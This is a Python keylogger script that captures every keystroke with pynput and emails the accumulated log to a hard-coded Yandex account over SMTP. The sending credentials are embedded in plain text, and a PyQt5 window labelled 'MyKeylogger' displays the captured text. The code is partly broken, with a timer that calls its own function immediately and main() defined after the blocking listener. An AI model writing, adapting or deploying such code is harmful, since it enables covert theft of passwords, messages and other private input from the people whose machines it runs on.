import sys
import threading
from PyQt5.QtWidgets import QApplication, QMainWindow, QTextEdit, QLineEdit
import pynput.keyboard
import smtplib
""""
    def filter_words(self, char):
        text = self.text_edit.toPlainText()
        search_text = self.search_edit.text()
        if search_text:
            filtered_text = ' '.join(word for word in text.split() if search_text.lower() in word.lower())
            self.text_edit.setPlainText(filtered_text)
        else:
            self.text_edit.insertPlainText(char)
"""
log = ""
def calbackFunc(key):
    global log
    try:
        log = log + str(key.char)
    except AttributeError:
        if key == key.space:
            log = log + " "
        else:
            log = log + str(key)
    except:
        pass
    print(log)
keyloggerListener = pynput.keyboard.Listener(on_press=calbackFunc)

def sendEmail(email,password,message):
    emailServer = smtplib.SMTP("smtp.yandex.com",587)
    emailServer.starttls()
    emailServer.login(email,password)
    emailServer.sendmail(email,email,message)
    emailServer.quit()
def threadFunc():
    global log
    sendEmail("drewbarrymore34@yandex.com","ngmlkeguhqwwvcju",log.encode('utf-8'))
    log = ""
    timerObj = threading.Timer(10,threadFunc())
    timerObj.start()

with keyloggerListener:
    threadFunc()
    keyloggerListener.join()
def main():
    app = QApplication(sys.argv)
    window = QMainWindow()
    window.setGeometry(100, 100, 400, 250)
    window.setWindowTitle("MyKeylogger")

    text_edit = QTextEdit(window)
    text_edit.move(50, 50)
    text_edit.resize(300, 150)
    text_edit.setEnabled(False)
    text_edit.setStyleSheet("color: red;")
    text_edit.setPlainText(log)

    search_edit = QLineEdit(window)
    search_edit.move(50, 20)
    search_edit.resize(300, 20)
    search_edit.setStyleSheet("color: blue;")

    window.show()
    sys.exit(app.exec_())

if __name__ == "__main__":
    main()
